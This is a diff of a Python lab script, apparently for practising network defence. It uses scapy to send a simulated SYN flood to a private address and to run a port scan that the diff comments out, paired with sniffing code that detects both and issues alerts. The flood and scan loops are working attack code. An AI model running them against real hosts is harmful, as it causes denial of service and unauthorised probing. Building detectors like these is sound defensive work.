@@ -1,17 +1,17 @@
 # python script to simulate SYN flood attack and PORT scanning
 from scapy.all import sniff, TCP, IP, send
 p= sniff(count=5,filter="tcp")
-p.summary()
-p[0][1].show()
+#p.summary()
+#p[0][1].show()
 for i in range(100):
         npkt = IP(dst="172.31.15.86") / TCP(dport=80, flags="S")
         send(npkt)
-for port in range(20, 1024):  # Scan ports 20-1024
-    packet = IP(dst="172.31.12.39") / TCP(dport=port, flags="S")
-    send(packet)
+#for port in range(20, 1024):  # Scan ports 20-1024
+ #   packet = IP(dst="172.31.12.39") / TCP(dport=port, flags="S")
+  #  send(packet)
 
 
-# python script to sniff packets for any SYN flood and alert user with a snort rule 
+# python script to sniff packets for any SYN flood and alert user with a snort rule and ufw rule
 from scapy.all import sniff, IP, TCP
 import time
 
@@ -41,7 +41,7 @@ def detect_syn(packet):
 sniff(filter="tcp", prn=detect_syn, store=0)
 
 # python script to sniff packets for any PORT scn and alert user with a snort rule 
-from scapy.all import sniff, IP, TCP
+'''from scapy.all import sniff, IP, TCP
 import time
 
 scan_count = {}
@@ -71,5 +71,5 @@ def detect_scan(packet):
         start_time = time.time()
 
 # Start sniffing
-sniff(filter="tcp", prn=detect_scan, store=0)
+sniff(filter="tcp", prn=detect_scan, store=0)'''
 
